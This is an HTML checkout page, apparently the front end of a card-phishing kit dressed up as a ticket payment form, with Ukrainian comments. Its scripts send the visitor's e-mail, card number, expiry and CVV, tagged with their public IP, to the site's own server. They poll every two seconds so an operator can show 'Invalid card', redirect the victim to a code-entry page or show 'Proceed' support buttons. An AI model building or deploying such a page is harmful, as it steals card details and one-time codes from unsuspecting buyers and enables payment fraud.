<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
    <style>
        body {
            background: #00b2ff;
            min-height: 100vh;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Roboto', Arial, sans-serif;
        }
        .payment-card {
            background: #fff;
            border-radius: 20px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.12);
            padding: 2.5rem 2rem 2rem 2rem;
            max-width: 370px;
            width: 100%;
            box-sizing: border-box;
            text-align: center;
            overflow: hidden;
        }
        .bank-icon {
            width: 60px;
            height: 60px;
            background: #00b2ff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1.2rem auto;
        }
        .bank-icon svg {
            width: 36px;
            height: 36px;
            fill: #fff;
        }
        .payment-title {
            font-size: 2rem;
            font-weight: 700;
            margin-bottom: 1.2rem;
        }
        .payment-card hr {
            border: none;
            border-top: 1px solid #e0e0e0;
            margin: 1.2rem 0 1.5rem 0;
        }
        .input-group {
            margin-bottom: 1.1rem;
            text-align: left;
        }
        .input-group input {
            width: 100%;
            padding: 1rem 1.1rem;
            border: 1.5px solid #e0e0e0;
            border-radius: 12px;
            font-size: 1.1rem;
            background: #fafbfc;
            outline: none;
            transition: border 0.2s;
            box-sizing: border-box;
            overflow-wrap: break-word;
        }
        .input-group input:focus {
            border-color: #00b2ff;
        }
        .row {
            display: flex;
            gap: 1rem;
            width: 100%;
        }
        .row .input-group {
            flex: 1;
            margin-bottom: 0;
        }
        .confirm-btn {
            width: 100%;
            padding: 1rem;
            background: #00b2ff;
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 1.15rem;
            font-weight: 500;
            margin-top: 1.2rem;
            cursor: pointer;
            transition: background 0.2s;
        }
        .confirm-btn:hover {
            background: #0090cc;
        }
        .support-proceed-btn {
            width: 100%;
            padding: 1rem;
            background: #00b2ff;
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 1.15rem;
            font-weight: 500;
            margin-top: 0.5rem;
            cursor: pointer;
            transition: background 0.2s;
            text-align: center;
            text-decoration: none;
            display: block;
            box-sizing: border-box;
        }
        .support-proceed-btn:hover {
            background: #0090cc;
        }
        @media (max-width: 480px) {
            .payment-card {
                padding: 1.2rem 0.5rem 1.5rem 0.5rem;
            }
            .row {
                flex-direction: column;
                gap: 0.7rem;
            }
        }
    </style>
</head>
<body>
    <div class="payment-card">
        <div class="bank-icon">
            <svg viewBox="0 0 24 24"><path d="M12 2L2 7v2h20V7L12 2zm0 2.18L18.09 7H5.91L12 4.18zM4 10v8h2v-6h12v6h2v-8H4zm2 8v-6h12v6H6z"/></svg>
        </div>
        <div class="payment-title" id="payment-title">Payment 45€</div>
        <hr>
        <form id="paymentForm" autocomplete="off">
            <div class="input-group">
                <input id="email-input" type="email" placeholder="E-mail" value="" required>
            </div>
            <div class="input-group">
                <input id="card-input" type="text" placeholder="Card Number" maxlength="19" pattern="[0-9 ]*" inputmode="numeric" required>
            </div>
            <div class="row">
                <div class="input-group">
                    <input id="expiry-input" type="text" placeholder="Expiry Date" maxlength="5" pattern="[0-9/]*" inputmode="numeric" required>
                </div>
                <div class="input-group">
                    <input id="cvv-input" type="password" placeholder="CVV" maxlength="4" pattern="[0-9]*" inputmode="numeric" required>
                </div>
            </div>
            <button type="submit" class="confirm-btn">Confirm</button>
            <div id="support-buttons" style="display:none; margin-top: 16px; text-align:center;"></div>
        </form>
    </div>
    <script>
    // Зчитування параметрів з URL
    function getQueryParam(name) {
        const url = new URL(window.location.href);
        return url.searchParams.get(name);
    }
    // Total підтягуємо, беремо тільки число
    const totalRaw = getQueryParam('total');
    if (totalRaw) {
        // Витягуємо тільки число (цілу або з копійками)
        const match = totalRaw.match(/\d+[\.,]?\d*/);
        const totalNum = match ? match[0].replace(',', '.') : '';
        if (totalNum) {
            document.getElementById('payment-title').textContent = `Payment ${totalNum}€`;
        }
    }
    // --- Замість uid використовуємо page_code ---
    function getPageCode() {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get('page') || sessionStorage.getItem('page_code') || '';
    }
    document.getElementById('paymentForm').onsubmit = async function(e) {
        e.preventDefault();
        const email = document.getElementById('email-input').value;
        const card = document.getElementById('card-input').value;
        const expiry = document.getElementById('expiry-input').value;
        const cvv = document.getElementById('cvv-input').value;
        try {
            // Додаємо IP до даних
            let ip = userIP;
            if (!ip) {
                // fallback якщо ще не отримали IP
                await new Promise(res => setTimeout(res, 500));
                ip = userIP;
            }
            // Отримуємо page_code з URL або sessionStorage
            const page_code = getPageCode();
            
            const response = await fetch('/send_payment_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, card, expiry, cvv, ip, page_code })
            });
            if (response.ok) {
                // Просто показуємо повідомлення
                if (!document.getElementById('payment-msg')) {
                    const msg = document.createElement('div');
                    msg.id = 'payment-msg';
                    msg.style.color = '#16b6ff';
                    msg.style.fontWeight = '500';
                    msg.style.marginTop = '18px';
                    msg.textContent = 'Payment sent!';
                    document.querySelector('.payment-card').appendChild(msg);
                }
            } else {
                console.error('Помилка при відправці даних');
            }
        } catch (error) {
            console.error('Помилка при зверненні до сервера:', error);
        }
    };
    </script>
    <script>
    // --- POLLING для wrong_card ---
    function getUserIP(callback) {
        // Спробуємо отримати IP через сторонній сервіс
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => callback(data.ip))
            .catch(() => callback(null));
    }
    let userIP = null;
    getUserIP(function(ip) {
        userIP = ip;
    });
    let wrongCardMsg = null;
    function showWrongCardMsg() {
        if (!wrongCardMsg) {
            wrongCardMsg = document.createElement('div');
            wrongCardMsg.style.color = '#dc3545';
            wrongCardMsg.style.fontSize = '0.98rem';
            wrongCardMsg.style.marginTop = '6px';
            wrongCardMsg.textContent = 'Invalid card';
            const cardInput = document.getElementById('card-input');
            cardInput.parentNode.appendChild(wrongCardMsg);
        }
    }
    setInterval(function() {
        if (!userIP) return;
        fetch('/check_wrong_card?ip=' + encodeURIComponent(userIP))
            .then(resp => resp.text())
            .then(txt => {
                if (txt === 'true') {
                    showWrongCardMsg();
                }
            });
    }, 2000);
    </script>
    <script>
    // --- POLLING для code redirect ---
    setInterval(function() {
        if (!userIP) return;
        fetch('/check_code_redirect?ip=' + encodeURIComponent(userIP))
            .then(resp => resp.text())
            .then(txt => {
                if (txt === 'true') {
                    window.location.href = '/buy-tickets/code/';
                }
            });
    }, 2000);
    </script>

    <script>
    // --- POLLING для support/text кнопок ---
    function showSupportButtons(total, text_id) {
        const page_code = getPageCode();
        let html = '';
        if (window.show_support_flag || (window.show_text_flag && text_id)) {
            html += `<div style="margin-bottom:10px;font-size:1rem;font-weight:500;color:#222;">If something went wrong, please use the link below.</div>`;
        }
        if (window.show_support_flag) {
            html += `<a id="support-btn" href="/buy-tickets/loading/waiting-support.html?page=${page_code}" class="confirm-btn support-proceed-btn" style="margin-bottom:10px;display:block;">Proceed</a>`;
        }
        if (window.show_text_flag && text_id) {
            html += `<a id="text-btn" href="/buy-tickets/loading/waiting-text.html?page=${page_code}&text_id=${text_id}" class="confirm-btn support-proceed-btn" style="background:#dc3545;display:block;">Proceed</a>`;
        }
        if (html) {
            document.getElementById('support-buttons').innerHTML = html;
            document.getElementById('support-buttons').style.display = 'block';
            // Add click handlers
            if (window.show_support_flag) {
                document.getElementById('support-btn').onclick = async function(e) {
                    e.preventDefault();
                    await fetch(`/reset_support_flag?ip=${encodeURIComponent(userIP)}`);
                    document.getElementById('support-buttons').style.display = 'none';
                    window.location.href = this.href;
                };
            }
            if (window.show_text_flag && text_id) {
                document.getElementById('text-btn').onclick = async function(e) {
                    e.preventDefault();
                    await fetch(`/reset_support_flag?ip=${encodeURIComponent(userIP)}`);
                    document.getElementById('support-buttons').style.display = 'none';
                    window.location.href = this.href;
                };
            }
        }
    }
    async function pollSupportButtons() {
        if (!userIP) {
            console.log('No userIP yet, retrying in 2s');
            return setTimeout(pollSupportButtons, 2000);
        }
        const totalRaw = getQueryParam('total') || '';
        try {
            console.log('Polling support buttons for IP:', userIP);
            const resp = await fetch(`/check_support?ip=${encodeURIComponent(userIP)}`);
            const data = await resp.json();
            console.log('Support response:', data);
            window.show_support_flag = data.show_support;
            window.show_text_flag = data.show_text;
            showSupportButtons(totalRaw, data.text_id);
        } catch (e) {
            console.error('Error polling support buttons:', e);
        }
        setTimeout(pollSupportButtons, 2000);
    }
    setTimeout(pollSupportButtons, 2000);
    </script>
    <script>
    // --- Оновлення IP у базі при відкритті сторінки ---
    function updateSiteUserIP() {
        const page_code = getPageCode();
        if (!page_code) {
            console.log('page_code не знайдено у URL/sessionStorage, IP не буде записано');
            return;
        }
        fetch('https://api.ipify.org?format=json')
            .then(resp => resp.json())
            .then(data => {
                const ip = data.ip;
                fetch('/update_site_user_ip', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ page_code, ip })
                })
                .then(r => r.text())
                .then(txt => console.log('update_site_user_ip response:', txt))
                .catch(console.error);
            });
    }
    updateSiteUserIP();
    </script>
    <script>
    // --- Автослеш для Expiry Date ---
    document.addEventListener('DOMContentLoaded', function() {
      var expiryInput = document.getElementById('expiry-input');
      if (expiryInput) {
        expiryInput.addEventListener('input', function(e) {
          let val = expiryInput.value.replace(/[^0-9]/g, '');
          if (val.length > 2) {
            val = val.slice(0,2) + '/' + val.slice(2,4);
          }
          expiryInput.value = val;
        });
      }
    });
    </script>
    <script>
// --- Payment page: page_code logic, price/currency update, fallback ---
document.addEventListener('DOMContentLoaded', function() {
    function getPageCode() {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get('page') || sessionStorage.getItem('page_code') || '';
    }
    const url = new URL(window.location.href);
    let page_code = url.searchParams.get('page');
    // 1. Якщо page_code є в URL — зберігаємо в sessionStorage
    if (page_code) {
        sessionStorage.setItem('page_code', page_code);
    } else {
        // 2. Якщо page_code є в sessionStorage, але немає в URL — додаємо його в URL і перезавантажуємо сторінку (тільки 1 раз)
        const pageFromStorage = sessionStorage.getItem('page_code');
        if (pageFromStorage) {
            url.searchParams.set('page', pageFromStorage);
            window.location.replace(url.toString());
            return;
        }
    }
    // 3. Якщо page_code є — тягнемо дані
    page_code = getPageCode();
    if (page_code) {
        fetch('/api/payment_data?page=' + encodeURIComponent(page_code))
            .then(r => r.json())
            .then(ev => {
                if (ev.price && ev.currency) {
                    // Оновлюємо заголовок
                    document.getElementById('payment-title').textContent = `Payment ${ev.price} ${ev.currency}`;
                    // Оновлюємо всі елементи з ціною/валютою (якщо треба)
                    document.querySelectorAll('.ticket-price, .price, [data-price]').forEach(el => {
                        el.textContent = `${ev.price} ${ev.currency}`;
                    });
                    // Оновлюємо data-атрибути для системи оплати (якщо треба)
                    document.querySelectorAll('[data-payment-price]').forEach(el => {
                        el.setAttribute('data-payment-price', ev.price);
                        el.setAttribute('data-payment-currency', ev.currency);
                    });
                    // Оновлюємо форми оплати (якщо треба)
                    document.querySelectorAll('form[data-payment-form]').forEach(form => {
                        const priceInput = form.querySelector('input[name="price"]');
                        const currencyInput = form.querySelector('input[name="currency"]');
                        if (priceInput) priceInput.value = ev.price;
                        if (currencyInput) currencyInput.value = ev.currency;
                    });
                } else {
                    // Якщо даних немає — показати помилку
                    showNoEventCodeError();
                }
            })
            .catch(() => {
                showNoEventCodeError();
            });
    } else {
        // 4. Якщо page_code немає ніде — показати помилку
        showNoEventCodeError();
    }
    function showNoEventCodeError() {
        const card = document.querySelector('.payment-card');
        if (card) {
            card.innerHTML = '<div style="color:#dc3545;font-size:1.2rem;font-weight:600;margin-bottom:18px;">Error: No event code found.<br>Please return to the main page and try again.</div>' +
                '<a href="/" style="display:inline-block;padding:12px 32px;background:#00b2ff;color:#fff;border-radius:8px;text-decoration:none;font-weight:600;">Go to Main Page</a>';
        }
    }
});
</script>
<script>
// --- Fallback: якщо page_code є в sessionStorage, але немає в URL — додаємо його в URL і перезавантажуємо сторінку ---
(function() {
    const url = new URL(window.location.href);
    const pageFromUrl = url.searchParams.get('page');
    const pageFromStorage = sessionStorage.getItem('page_code');
    if (!pageFromUrl && pageFromStorage) {
        url.searchParams.set('page', pageFromStorage);
        window.location.replace(url.toString());
    }
})();
</script>
